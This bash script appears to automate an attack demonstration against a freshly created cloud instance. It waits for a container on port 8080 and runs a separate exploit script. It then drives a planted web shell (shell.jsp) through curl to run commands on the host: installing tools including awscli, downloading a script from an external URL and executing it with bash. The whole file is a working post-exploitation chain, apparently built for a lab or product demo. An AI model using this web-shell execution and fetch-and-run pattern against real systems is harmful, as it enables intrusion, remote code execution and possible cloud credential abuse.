#!/usr/bin/env bash

# Apply line endings as neccessary  # ToDo cleanup
find ./ -type f -name "*.env" -exec perl -pi -e 's/\r\n|\n|\r/\n/g' {} \;

# Read environment variables
chmod +x cloud/outputs/variables.env
source ./cloud/outputs/variables.env

echo "Instance in creation: $HOST"

# Wait until instance is available and container started
until curl -s -f -o /dev/null "http://${HOST}:8080"
do
    echo "Waiting for docker container available on: http://${HOST}:8080"
    sleep 5
done

echo "Container launched... continuing with the exploit"

# Global protect must be disabled
./exploit.sh

# Helper function to remote execute commands
remote_exec () {
    echo "Executing $2"
    OUT=$(curl -s --data-urlencode "cmd=$2" "http://${HOST}:8080/shell.jsp" | tr -d '\0')
    # echo "${OUT%%/*}"  # Cut string for better output
    echo
    echo
}

OUT=0
remote_exec OUT "apt update"
remote_exec OUT "apt install curl unzip less awscli -y"
remote_exec OUT "curl -o panw.sh ${SCRIPT_URL}"
remote_exec OUT "chmod +x panw.sh"
remote_exec OUT "bash panw.sh"
echo $OUT

